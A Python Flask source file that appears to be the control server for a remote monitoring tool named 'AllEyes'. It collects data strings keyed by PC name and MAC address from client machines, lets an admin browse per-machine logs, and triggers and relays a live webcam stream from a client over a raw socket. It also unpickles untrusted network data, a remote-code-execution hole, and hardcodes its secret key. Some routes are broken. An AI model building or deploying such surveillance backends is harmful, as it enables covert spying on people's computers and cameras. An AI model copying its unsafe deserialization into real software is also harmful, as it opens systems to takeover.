import socket
import threading
import struct
import pickle
from flask import Flask, request, render_template, session, Response, redirect
import sqlite3
from datetime import date
from datetime import datetime
from pytz import timezone
import os
from helpers import login_required
import cv2
from werkzeug.security import check_password_hash
app = Flask(__name__)
app.secret_key = 'my secret'
status1 = '0'
frame = None

@app.route("/index/log", methods = ["POST"])
@login_required
def funk6():
    if request.method == "POST":
         macid = request.form.get("mac")
         print(macid)
         data = []
         conn = sqlite3.connect("dope.db")
         c = conn.cursor()
        #  c.execute('select * from data where mac = ? LIMIT 100 order by time DESC', (macid,))
         c.execute('SELECT * FROM data WHERE mac = ? ORDER BY time DESC ', (macid,))

         rows = c.fetchall()
         for row in rows:
              temp = []
              temp.append(row[2])
              temp.append(row[3])
              data.append(temp)
         return render_template("log.html", data = data)

@app.route("/index", methods = ["GET"])
@login_required
def funk5():
    data = []
    conn = sqlite3.connect("dope.db")
    c = conn.cursor()
    c.execute('select distinct pcname, mac from data')
    rows = c.fetchall()
    for row in rows:
         temp = []
         temp.append(row[0])
         temp.append(row[1])
         data.append(temp)
    return render_template('index.html', data = data)
     

@app.route("/logout", methods = ["GET"])
def funk4():
     session.clear()
     return redirect("/login")
@app.route("/login", methods= ["GET", "POST"])
def funk3():
     if request.method == "POST":
          username = 'lol'
          password1 = 'lol'
          try:
               username = request.form.get("username")
               password1 = request.form.get("password")
          except:
               pass
          conn = sqlite3.connect("dope.db")
          c = conn.cursor()
          c.execute('select * from admin_users where username = ?', (username,))
          rows = c.fetchall()
          if len(rows) != 1:
               print('wrong username')
               return "Wrong username"
          for row in rows:
              result = (check_password_hash(pwhash=row[1], password=password1))
              if result == True:
                   session['id'] = username
                   return redirect("/index")
              return "wrong password"
     auth = request.authorization
    #  env_password = os.environ.get('PASSWORD')
    #  env_username = os.environ.get('USERNAME')
     if not auth or auth.username != <USERNAME> or auth.password != <PASSWORD>:
         return Response('Could not verify your credentials', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
     return render_template("loginPage.html")

@app.route("/", methods = ["GET"])
def funk0():
    return render_template("downloadpage.html")
    # try: 
    #     print(session['id'])
    # except:
    #     pass
    # return "<h1>This is a sample home page for this server</h1> <a href = 'https://drive.google.com/file/d/1wD3O2YCgqOHQFhxQiAiUcLRGEFBChZfs/view?usp=share_link' > Download AllEyes</a>"
    # return "https://drive.google.com/file/d/1wD3O2YCgqOHQFhxQiAiUcLRGEFBChZfs/view?usp=share_link"
@app.route("/send",methods=["POST"])
def funk1():
    data = request.get_json()       
    username = data.get('username')
    key = data.get('key')
    mac1 = data.get('mac')
    string1 = data.get('string')
    if key == <KEY>: 
        conn = sqlite3.connect("dope.db")
        c = conn.cursor()
        c.execute('''Create table if not exists data (pcname text, mac text , data text, time text) ''')
        c.execute('''create table if not exists admin_users(username text primary key, hash text required)''')
        c.execute('insert or ignore into data(pcname,mac, data, time) values (?,?,?,?)',(username,mac1,string1,datetime.now(timezone('Asia/Kolkata'))))
        print('gifkmfd')
        conn.commit()

        conn.close()
        return "done"
    else:
        return "fail"
    file.close()
@app.route("/recieve",methods=["POST"])
def funk2(key,username):
    conn = sqlite3.connect("dope.db")
    c = conn.cursor()
    cursor = c.execute('select * from data where username = ?',(username))
    dict['pcname']= username 
    data = []
    for row in cursor :
        time=[]
        time.append(row[2])
        time.append(row[1])
        data.append(time)
    return data


@app.route('/cammic', methods = ['GET', 'POST'])
def tatata():
    return "hello cutie"


@app.route('/cammic/command', methods=['GET', 'POST'])
def send_command():
    if request.method == 'GET':
        global status1
        command1 = '1'
        if command1 == '1' and status1 == '0':
            status1 = '1'
            print('calling the receiving function')
            receiver_thread = threading.Thread(target=receive_streaming)
            receiver_thread.start()
            print('returning 1')
            print(command1)
        elif command1 == '0':
            receiver_thread.join()
    return '1'

def receive_streaming():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = socket.gethostbyname(socket.gethostname())
    print('HOST IP:', host_ip)
    port = <PORT>
    socket_address = (host_ip, port)
    print('Socket created')

    # Bind the socket to the host.
    server_socket.bind(socket_address)
    print('Socket bind complete')

    # Listen for incoming connections.
    server_socket.listen(1)
    print('Socket now listening')

    while True:
        client_socket, addr = server_socket.accept()
        print('Connection from:', addr)
        if client_socket:
            data = b""
            payload_size = struct.calcsize("Q")
            while True:
                while len(data) < payload_size:
                    packet = client_socket.recv(4 * 1024)
                    if not packet:
                        break
                    data += packet
                if not packet:
                    break
                packed_msg_size = data[:payload_size]
                data = data[payload_size:]
                try:
                    msg_size = struct.unpack("Q", packed_msg_size)[0]
                except:
                    pass
                while len(data) < msg_size:
                    data += client_socket.recv(4 * 1024)

                frame_data = data[:msg_size]
                data = data[msg_size:]
                global frame
                frame = pickle.loads(frame_data)
        print("exiting")

def generate_frame():
    global frame
    while True:
        if frame is not None:
            # Convert the frame to JPEG format
            ret, buffer = cv2.imencode('.jpg', frame)
            frame_bytes = buffer.tobytes()
            # Yield the frame as an image response
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n\r\n')

@app.route('/cammic/index', methods=['GET'])
def index():
    return Response(generate_frame(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/cammic/vid_feed', methods =['GET','POST'])
def vid_feed():
    return render_template('index1.html')


if __name__ == "__main__":
	app.run()
